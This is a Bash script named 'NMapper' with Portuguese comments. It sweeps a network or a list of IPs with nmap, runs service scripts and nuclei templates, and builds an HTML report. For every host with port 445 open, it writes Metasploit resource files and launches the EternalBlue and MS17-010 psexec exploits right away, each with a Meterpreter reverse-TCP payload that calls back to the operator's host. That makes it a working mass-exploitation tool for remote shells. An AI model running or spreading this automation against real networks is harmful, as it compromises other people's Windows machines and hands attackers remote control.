#!/bin/bash

# Definição de Cores
verde="\033[1;32m"
amarelo="\033[1;33m"
vermelho="\033[1;31m"
reset="\033[0m"

# Banner
clear
echo -e "${verde}"
echo "====================================="
echo "             NMapper              "
echo "    Powered by Silvanystro - v2.1.2    "
echo "====================================="
echo -e "${reset}"

# Espaço
for i in {1..5}; do echo ""; done

# Variáveis
PORTAS_HTTP="80 443 8080 8443 8000 8888"
TEMPLATE_PATH="$HOME/nuclei-templates"
PARALLEL=8
REDE=""
LISTA=""
LHOST="0.0.0.0"
ALVOS=()

# Função Help
function help_menu() {
    echo -e "${verde}Modo de uso:${reset}"
    echo "./nmapper.sh [opções]"
    echo ""
    echo "Opções disponíveis:"
    echo "  -r <rede_cidr>    Escanear uma rede completa (ex: 192.168.0.0/24)"
    echo "  -i <ip>           Escanear um IP específico (ex: 192.168.0.10)"
    echo "  -l <lista.txt>    Escanear uma lista de IPs"
    echo "  -h <lhost>        Definir o IP local para payloads (ex: 192.168.0.5)"
    echo "  --help            Exibir este menu de ajuda"
    exit 0
}

# Parseando argumentos
while [[ $# -gt 0 ]]; do
  case "$1" in
    -r) REDE="$2"; shift 2;;
    -i) ALVOS+=("$2"); shift 2;;
    -l) LISTA="$2"; shift 2;;
    -h) LHOST="$2"; shift 2;;
    --help) help_menu;;
    *) echo -e "${vermelho}[!] Opção inválida. Use --help para ver as opções.${reset}"; exit 1;;
  esac
done

# Validação
if [ -z "$REDE" ] && [ ${#ALVOS[@]} -eq 0 ] && [ -z "$LISTA" ]; then
  echo -e "${vermelho}[!] Nenhum alvo definido.${reset}"
  help_menu
fi

# Diretórios
mkdir -p relatorio_html
> relatorio_html/portscan.txt
> relatorio_html/http_scripts.txt
> relatorio_html/ssh_scripts.txt
> relatorio_html/ftp_scripts.txt
> relatorio_html/rdp_scripts.txt
> relatorio_html/smb_scripts.txt
> relatorio_html/nuclei_results.txt
> relatorio_html/eternalblue.txt
> relatorio_html/smbv1.txt

# Descobrir hosts
if [ ! -z "$REDE" ]; then
  echo -e "${amarelo}[*] Escaneando rede $REDE...${reset}"
  HOSTS_ATIVOS=$(nmap -n -sn "$REDE" | grep "report for" | awk '{print $5}')
elif [ ! -z "$LISTA" ]; then
  echo -e "${amarelo}[*] Carregando lista de IPs: $LISTA...${reset}"
  HOSTS_ATIVOS=$(cat "$LISTA")
else
  echo -e "${amarelo}[*] Escaneando IPs individuais...${reset}"
  HOSTS_ATIVOS="${ALVOS[@]}"
fi

echo -e "${verde}[+] Alvos encontrados:${reset}"
echo "$HOSTS_ATIVOS"

# Função de escaneamento
scan_ip() {
  local ip="$1"
  echo -e "${amarelo}[*] Escaneando $ip...${reset}"
  PORTAS_ABERTAS=$(nmap -p- --min-rate=500 -T4 -oG - "$ip" | awk '/Ports:/{split($0,a,"Ports: "); split(a[2],b,","); for(i in b) {split(b[i],c,"/"); print "'$ip':"c[1]}}')

  for linha in $PORTAS_ABERTAS; do
    echo "$linha" | tee -a relatorio_html/portscan.txt
    IP=$(echo "$linha" | cut -d: -f1)
    PORTA=$(echo "$linha" | cut -d: -f2)

    if echo "$PORTAS_HTTP" | grep -wq "$PORTA"; then
      echo -e "${amarelo}[*] Rodando http-* scripts em $IP:$PORTA${reset}"
      nmap --script "http-*" -p "$PORTA" "$IP" >> relatorio_html/http_scripts.txt
    fi

    if [ "$PORTA" = "22" ]; then
      nmap --script "ssh-*" -p 22 "$IP" >> relatorio_html/ssh_scripts.txt
    fi

    if [ "$PORTA" = "20" ] || [ "$PORTA" = "21" ]; then
      nmap --script "ftp-*" -p "$PORTA" "$IP" >> relatorio_html/ftp_scripts.txt
    fi

    if [ "$PORTA" = "3389" ]; then
      nmap --script "rdp-*" -p 3389 "$IP" >> relatorio_html/rdp_scripts.txt
    fi

    if [ "$PORTA" = "445" ]; then
      nmap --script "smb-*" -p 445 "$IP" >> relatorio_html/smb_scripts.txt
      echo -e "${vermelho}[!] Porta 445 aberta detectada no $IP. Iniciando exploit EternalBlue e SMBv1...${reset}"

      cat <<EOF > eternalblue_$IP.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set RPORT 445
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
exploit -j
EOF

      msfconsole -q -r eternalblue_$IP.rc >> relatorio_html/eternalblue.txt

      cat <<EOF > smbv1_$IP.rc
use exploit/windows/smb/ms17_010_psexec
set RHOSTS $IP
set RPORT 445
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4455
exploit -j
EOF

      msfconsole -q -r smbv1_$IP.rc >> relatorio_html/smbv1.txt
    fi
  done
}

export -f scan_ip
export verde amarelo vermelho reset PORTAS_HTTP LHOST

# Escanear
echo "$HOSTS_ATIVOS" | xargs -n 1 -P "$PARALLEL" bash -c 'scan_ip "$@"' _

# Rodar Nuclei
for linha in $(cat relatorio_html/portscan.txt); do
  IP=$(echo "$linha" | cut -d: -f1)
  PORTA=$(echo "$linha" | cut -d: -f2)
  if echo "$PORTAS_HTTP" | grep -wq "$PORTA"; then
    URL="http://$IP:$PORTA"
    nuclei -u "$URL" -t "$TEMPLATE_PATH" -timeout 10 -rate-limit 100 >> relatorio_html/nuclei_results.txt
  fi
  done

# Geração de Relatório HTML
bash gerar_html.sh

